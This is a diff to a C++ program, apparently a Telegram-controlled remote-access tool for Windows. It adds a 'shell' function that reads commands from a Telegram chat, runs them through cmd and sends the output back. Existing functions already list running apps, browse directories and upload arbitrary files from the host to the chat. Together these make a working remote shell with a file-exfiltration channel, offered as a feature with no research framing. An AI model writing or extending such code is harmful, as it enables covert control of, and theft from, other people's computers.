@@ -7,6 +7,7 @@
 #include <chrono>
 #include <thread>
 #include <vector>
+#include <filesystem>
 
 #include <opencv2/opencv.hpp>
 #include <nlohmann/json.hpp>
@@ -18,6 +19,7 @@
 #include "globals.h"
 
 using json = nlohmann::json;
+namespace fs = std::filesystem;
 
 void getStatus(std::string) {
     std::string status;
@@ -422,6 +424,10 @@ void RunningApps(std::string) {
 }
 
 void ListOfFiles(std::string path) {
+    if (path.empty()) {
+        path = fs::current_path().generic_string();
+    }
+
     if (!tools::info::isDir(path)) {
         telegram::SendText("Path doesn't exists or it's a file");
         return;
@@ -560,4 +566,48 @@ void SendFile(std::string path) {
 
     if (!telegram::SendFile(path))
         telegram::SendText("Couldn't send!");
+}
+
+void shell(std::string) {
+    telegram::SendText("it's just simple shell\n usage:\ncd - change directory\nls - list files in directory\nquit - guess what\n you can also use every command that is avaiable in cmd\n *BE CAREFUL!* when you launch something that doesn't exit itself like cmd.exe then you lost this istance since reboot:(");
+    telegram::SendText("Current Directory: " + fs::current_path().generic_string());
+    int LastMessageId = -1;
+
+    while (true) {
+        Sleep(REFRESH * 1000);
+
+        json message = telegram::GetLastMessage();
+
+        if (LastMessageId == message["message_id"])
+            continue;  // continue if that request is already done
+        if (time(nullptr) - message["date"] > REFRESH + 3)
+            continue;  // continue if that request is too old
+
+        LastMessageId = message["message_id"].get<int>();
+
+        parse::ParsedMessage pm = parse::Parse(message["text"]);
+        std::string command = message["text"];
+
+        if (pm.ID == "cd") {
+            if (pm.command.empty()) {
+                telegram::SendText("Current Directory: " + fs::current_path().generic_string());
+            } else if(pm.command == "..") {
+                fs::current_path(fs::current_path().parent_path());
+            }
+            else {
+                fs::current_path(pm.command + " " + pm.parameters);
+            }
+            continue;
+        }
+
+        if (pm.ID == "quit") 
+            return;
+        
+        if (pm.ID == "ls") {
+            ListOfFiles(command.substr(2, command.size()));
+            continue;
+        }
+       
+        telegram::SendText(tools::info::cmdOutput(command.c_str()));
+    }
 }
